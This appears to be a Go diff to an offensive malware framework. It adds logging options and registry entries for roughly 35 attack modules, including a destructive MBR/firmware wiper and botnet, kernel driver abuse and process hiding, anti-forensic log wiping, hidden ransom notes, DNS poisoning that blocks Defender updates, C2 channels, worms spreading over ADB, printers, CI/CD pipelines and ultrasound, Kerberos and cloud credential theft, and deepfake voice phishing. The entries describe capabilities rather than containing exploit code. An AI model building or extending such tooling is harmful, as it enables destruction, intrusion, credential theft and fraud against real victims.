@@ -66,6 +66,8 @@ func New(cfg *config.Config) (*AppState, error) {
 	log, err := logger.New(logger.Config{
 		Level:     cfg.Logging.Level,
 		Format:    cfg.Logging.Format,
+		Output:    cfg.Logging.Output,
+		File:      cfg.Logging.File,
 		Component: "appstate",
 	})
 	if err != nil {
@@ -595,6 +597,46 @@ func (s *AppState) initModules() {
 		// v2.10: Apocalipsis + Phantom Evasion
 		{Name: "v210/apocalipsis", Type: "v210", Description: "APOCALIPSIS: core destroy (MBR+firmware+VRM+USB+BSOD) + multi-vector worm (6 vectors) + P2P botnet (Kademlia DHT) + hybrid crypto (Kyber+X25519+XChaCha20) + 12 extra evil ideas", CVE: "", Rank: "excellent", OS: "any"},
 		{Name: "v210/phantom_evasion", Type: "v210", Description: "PHANTOM 6-layer evasion: static (packer/crypter/code_cave) + disable enemy (AMSI/ETW/unhook) + Hell's Gate syscalls + sandbox detect (RAM/disk/VM/cpu/uptime/debug) + process blending (hollowing/LOLBins) + live mutation (30min cycle)", CVE: "", Rank: "excellent", OS: "any"},
+		// FASE 1: EVASIÓN + ANTI-FORENSE
+		{Name: "evasion/byovd_loader", Type: "evasion", Description: "BYOVD loader: WinRing0, Gdrv, RTCore64, kprocesshacker, cpuz — IOCTLs, R/W phys memory, MSR", CVE: "", Rank: "excellent", OS: "Windows"},
+		{Name: "evasion/dkom", Type: "evasion", Description: "DKOM: hide processes via ActiveProcessLinks unlink, steal SYSTEM token, EPROCESS offsets", CVE: "", Rank: "excellent", OS: "Windows"},
+		{Name: "evasion/anti_reversing", Type: "evasion", Description: "Anti-reversing: HW BP detect (DR0-DR7), INT3 scan, CRC integrity, RDTSC timing, sandbox/Virtual MAC check", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "evasion/anti_forensics_adv", Type: "evasion", Description: "Anti-forensics advanced: VAD hide, DoD 7-pass wipe, MFT/bitmap corruption, crash dump disable, event log/prefetch/USN/shellbag wipe", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "evasion/wer_persistence", Type: "evasion", Description: "WER persistence: Hangs hijack, Silent Process Exit, startup/run key/schtasks triple persistence", CVE: "", Rank: "excellent", OS: "Windows"},
+		{Name: "evasion/mft_slack", Type: "evasion", Description: "MFT slack storage: read/write in MFT slack space, AES-GCM encrypt, hide agent fragments/ransom notes", CVE: "", Rank: "excellent", OS: "Windows"},
+		{Name: "evasion/wfp_dns_poison", Type: "evasion", Description: "WFP DNS poisoning: WFP provider + netsh fallback, fake DNS server (UDP 53), hosts injection, cache flush", CVE: "", Rank: "excellent", OS: "Windows"},
+		{Name: "evasion/blue_pill", Type: "evasion", Description: "Blue Pill Lite hypervisor: VMXON/VMCS VT-x, PatchGuard bypass, CPUID trap, memory hide", CVE: "", Rank: "excellent", OS: "Windows"},
+		{Name: "evasion/lolbin_chainer", Type: "evasion", Description: "LOLBin dynamic chain: 28 bins (20 Win + 8 Linux), random chain per hour, multi-layer base64 encoding", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "evasion/wfp_kernel_dns", Type: "evasion", Description: "Kernel DNS driver: NDIS filter, block Defender updates, intercept Windows Updates, DNS->C2 redirect", CVE: "", Rank: "excellent", OS: "Windows"},
+		// FASE 2: C2 HARDENED
+		{Name: "c2/spiffe_mtls", Type: "c2", Description: "SPIFFE mTLS: SVID generation, trust bundle, peer SPIFFE ID verification, cert rotation", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "c2/multi_channel", Type: "c2", Description: "Multi-channel C2: gRPC->WebSocket->DoH->Twitter->Blockchain, health check, auto-failover, beacon loop", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "c2/ed25519", Type: "c2", Description: "Ed25519 signing: command sign/verify, nonce replay protection, trusted key ring, batch ops", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "c2/dashboard_ops", Type: "c2", Description: "Dashboard operations: HTTP+WS API, agent nodes, propagation map, signed command issuance", CVE: "", Rank: "great", OS: "any"},
+		{Name: "c2/kyber_hybrid", Type: "c2", Description: "Kyber-1024 + X25519 hybrid KEM: post-quantum KEM, AES-256-GCM + HMAC-SHA256 sessions", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "c2/proto_obfuscate", Type: "c2", Description: "Proto obfuscation: XOR+AES-CTR+GZIP, integrity verification, vaporize buffers, embedded loader", CVE: "", Rank: "great", OS: "any"},
+		// FASE 3: PROPAGACIÓN AVANZADA
+		{Name: "hydra/ultrasound", Type: "hydra", Description: "Ultrasound QPSK worm: >18kHz modulation, WAV generation, speaker/mic RX/TX, arecord receiver", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "hydra/powerline", Type: "hydra", Description: "Powerline PLC worm: HomePlug scan, UPnP SSDP, SOAP injection, port mapping over electrical grid", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "hydra/usb_adb", Type: "hydra", Description: "USB ADB worm: ADB devices, APK install, shell exec, SMS/contacts dump, sdcard persistence", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "hydra/dns_rebinding", Type: "hydra", Description: "DNS rebinding: TTL=0 rebind, SOP bypass JS payload, SSRF lateral via Host headers", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "hydra/cicd_webhooks", Type: "hydra", Description: "CI/CD webhooks: GitHub Actions/Jenkins/GitLab CI injection, artifact propagation, 10 env scanner", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "hydra/vlan_jump", Type: "hydra", Description: "VLAN jump: double tagging, DTP negotiation, ARP flood, DHCP discover per VLAN interface", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "hydra/qr_worm", Type: "hydra", Description: "QR dynamic worm: QR matrix generation, PNG rendering, rotation channel, finder/timing patterns", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "hydra/pjl_worm", Type: "hydra", Description: "PJL worm: printer job language exploits, NVRAM read/write, firmware infect, PCL ransom note", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "propagation/chronos_ntp", Type: "propagation", Description: "Chronos NTP manipulation: fake NTP server, time forward/rewind, scheduled task shift, w32tm hijack", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "propagation/reflective_dll", Type: "propagation", Description: "Reflective DLL NASM: NtCreateSection+NtMapViewOfSection, 100-byte stager, remote thread injection", CVE: "", Rank: "excellent", OS: "Windows"},
+		{Name: "propagation/kerberos_del", Type: "propagation", Description: "Kerberos delegation abuse: unconstrained delegation discovery, coercion, TGT dump, Silver Ticket", CVE: "", Rank: "excellent", OS: "Windows"},
+		{Name: "propagation/imdsv2_bypass", Type: "propagation", Description: "IMDSv2 bypass: token acquisition, IAM extraction, SSRF exploit, neighbor instance scan, STS AssumeRole", CVE: "", Rank: "excellent", OS: "any"},
+		// FASE 4: IA + CROSS-PLATFORM
+		{Name: "loader/cross_platform", Type: "loader", Description: "Cross-platform loader: ELF/Mach-O/APK generation, pack+encrypt, syscall hooks, anti-sandbox", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "ai/jit_polymorphism", Type: "ai", Description: "JIT polymorphism: NOP-sleds, constant obfuscation, code crossover, register reordering, runtime mutation loop", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "ai/orchestrator", Type: "ai", Description: "AI FSM orchestrator: Q-learning state transitions, exploration/exploitation, risk prediction, Q-table", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "ai/federated_learn", Type: "ai", Description: "Federated learning hivemind: FedAvg aggregation, victim profiling, optimal phishing time prediction", CVE: "", Rank: "great", OS: "any"},
+		{Name: "ai/autofactory", Type: "ai", Description: "Autofactory fuzzer: AFL++ integration, 9 mutation strategies, crash detection, exploit candidates", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "bridge/wazero", Type: "bridge", Description: "Wazero bridge: WASM module parsing, TinyGo compilation, Python handler migration to WASM", CVE: "", Rank: "great", OS: "any"},
+		{Name: "rf_contagion/baseband", Type: "rf", Description: "RF contagion: SDR detection (RTLSDR/HackRF), ModemManager, baseband injection, IMSI capture, SS7", CVE: "", Rank: "excellent", OS: "Linux"},
+		{Name: "ai/deepfake_vishing", Type: "ai", Description: "Deepfake vishing: Coqui TTS voice cloning, VoIP calls, SMS phishing, social engineering profiling", CVE: "", Rank: "excellent", OS: "any"},
 	}
 }
 
